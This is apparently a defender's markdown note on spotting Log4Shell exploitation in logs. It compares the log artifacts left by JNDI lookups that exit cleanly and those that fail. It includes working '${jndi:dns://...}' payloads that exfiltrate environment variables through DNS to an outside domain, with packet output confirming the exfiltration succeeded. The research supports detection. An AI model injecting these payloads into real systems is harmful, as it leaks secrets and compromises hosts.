# log4j
## Log based detection

The observed behavior is that logs contain different artifact types, based on whether the jNDI threads being called exit cleanly (faultless) or not. What is clean or not is finicky. 

Exploit flows which exit cleanly will show up in the logs with which I [assume](https://www.nomachetejuggling.com/2008/06/04/getting-a-java-objects-reference-id/) is an `objectName@ identityHashCode`, for example `com.sun.jndi.dns.DnsContext@2a406a7f`.

However, if for some reason the process/thread doesn't exit cleanly, the log will contain the string for which a monstrous regex is [available](https://github.com/back2root/log4shell-rex). An example would be `${jndi:dns://127.0.0.11/thisdomainwillnotexistandnotexitcleanly${env:POC_USERNAME}.net}`

> :warning: A non-clean exit does **NOT** mean the exploit was unsuccessful. So if you find the `${jndi...}` in your logs, still consider the system compromised.

I'll try to work through all the exploit types I can find, see which object names could point to successful compromise, and which `${jndi:...}` payloads actually do cause harm.

## DNS

| Context                                                      | Payload                                                      | Log artifact                                                 | Output                                                       |
| ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ |
| Working (for me) payload                                     | `${jndi:dns://8.8.8.8/${env:POC_USERNAME}.avuko.nl}`         | `com.sun.jndi.dns.DnsContext@<hashcode>`                     | `8.8.8.8 DNS 75	Standard query 0x08f2 TXT user.avuko.nl`  |
| Working (the exfil is successful) but full payload in the logs, because of a DNS error  code `0011 = Reply code: No such name (3)` | `${jndi:dns://8.8.8.8/doesnotexist.${env:POC_USERNAME}.net}` | `${jndi:dns://8.8.8.8/doesnotexist.${env:POC_USERNAME}.net}` | `8.8.8.8 DNS 82	Standard query 0xf62f TXT doesnotexist.user.net` |
|                                                              |                                                              |                                                              |                                                              |

 
